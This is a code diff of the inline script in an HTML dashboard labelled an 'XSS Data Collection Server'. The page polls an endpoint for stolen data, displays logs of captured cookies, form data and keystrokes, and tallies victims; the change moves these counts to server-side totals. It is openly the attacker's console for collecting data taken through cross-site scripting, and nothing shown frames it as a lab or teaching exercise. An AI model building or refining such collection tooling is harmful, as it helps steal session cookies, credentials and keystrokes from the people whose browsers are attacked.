@@ -152,56 +152,39 @@
     </div>
 
     <script>
-        let victimCount = 0;
-        let cookieCount = 0;
-        let formCount = 0;
-        let keystrokeCount = 0;
-
-        function updateStats() {
-            document.getElementById('victim-count').textContent = victimCount;
-            document.getElementById('cookie-count').textContent = cookieCount;
-            document.getElementById('form-count').textContent = formCount;
-            document.getElementById('keystroke-count').textContent = keystrokeCount;
+        function updateStats(totalCounts) {
+            document.getElementById('victim-count').textContent    = totalCounts.victims;
+            document.getElementById('cookie-count').textContent    = totalCounts.cookies;
+            document.getElementById('form-count').textContent      = totalCounts.formData;
+            document.getElementById('keystroke-count').textContent = totalCounts.keystrokes;
         }
 
         async function refreshLogs() {
             try {
                 const response = await fetch('/api/stolen-data');
                 const data = await response.json();
-                
+
                 const logContainer = document.getElementById('stolen-data-log');
                 logContainer.innerHTML = '<div>[SYSTEM] XSS Data Collection Server Online</div>';
-                
+
                 if (data.logs && data.logs.length > 0) {
                     data.logs.forEach(log => {
                         const logLine = document.createElement('div');
                         logLine.textContent = log;
                         logContainer.appendChild(logLine);
-                        
-                        // Update stats
-                        if (log.includes('COOKIES')) cookieCount++;
-                        if (log.includes('FORM_DATA')) formCount++;
-                        if (log.includes('KEYSTROKES')) keystrokeCount++;
                     });
-                    
-                    // Count unique IPs as victims
-                    const uniqueIPs = new Set();
-                    data.logs.forEach(log => {
-                        const ipMatch = log.match(/from ([\d\.:]+):/);
-                        if (ipMatch) uniqueIPs.add(ipMatch[1]);
-                    });
-                    victimCount = uniqueIPs.size;
-                    
                 } else {
                     logContainer.innerHTML += '<div>[SYSTEM] No stolen data received yet</div>';
                 }
-                
-                updateStats();
+
+                // Stats come from server-side totals, not from the truncated log
+                updateStats(data.totalCounts || { victims: 0, cookies: 0, formData: 0, keystrokes: 0 });
+
                 logContainer.scrollTop = logContainer.scrollHeight;
-                
+
             } catch (error) {
                 console.error('Failed to fetch logs:', error);
-                document.getElementById('stolen-data-log').innerHTML += 
+                document.getElementById('stolen-data-log').innerHTML +=
                     '<div style="color: #ff6b6b;">[ERROR] Could not fetch logs</div>';
             }
         }
@@ -209,28 +192,18 @@
         async function clearLogs() {
             try {
                 await fetch('/api/clear-logs', { method: 'POST' });
-                document.getElementById('stolen-data-log').innerHTML = 
+                document.getElementById('stolen-data-log').innerHTML =
                     '<div>[SYSTEM] XSS Data Collection Server Online</div><div>[SYSTEM] Logs cleared</div>';
-                
-                // Reset stats
-                victimCount = 0;
-                cookieCount = 0;
-                formCount = 0;
-                keystrokeCount = 0;
-                updateStats();
-                
+                updateStats({ victims: 0, cookies: 0, formData: 0, keystrokes: 0 });
             } catch (error) {
                 console.error('Failed to clear logs:', error);
             }
         }
 
-        // Auto-refresh logs every 500 milliseconds
+        // Auto-refresh every 500ms
         setInterval(refreshLogs, 500);
 
-        // Initialize
-        window.onload = function() {
-            refreshLogs();
-        };
+        window.onload = refreshLogs;
     </script>
 </body>
 </html>
